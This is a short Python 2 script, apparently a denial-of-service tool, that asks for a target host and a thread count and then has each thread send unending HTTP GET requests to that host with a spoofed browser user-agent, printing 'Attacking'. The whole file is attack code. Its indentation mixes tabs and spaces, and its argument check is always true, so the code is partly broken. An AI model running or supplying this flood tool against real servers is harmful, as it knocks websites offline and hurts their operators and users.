import threading
import requests
import sys
host = raw_input("Host/ip:")
thread_num = input("threads:")

def run():
	if len(sys.argv)>=1:
		url="http://"+host
		print "Attacking",host 
        while True:
			headers={'user-agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"}
			r = requests.get(url,headers=headers)
			
	else:
		print "It only work on HTTP server!!!"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()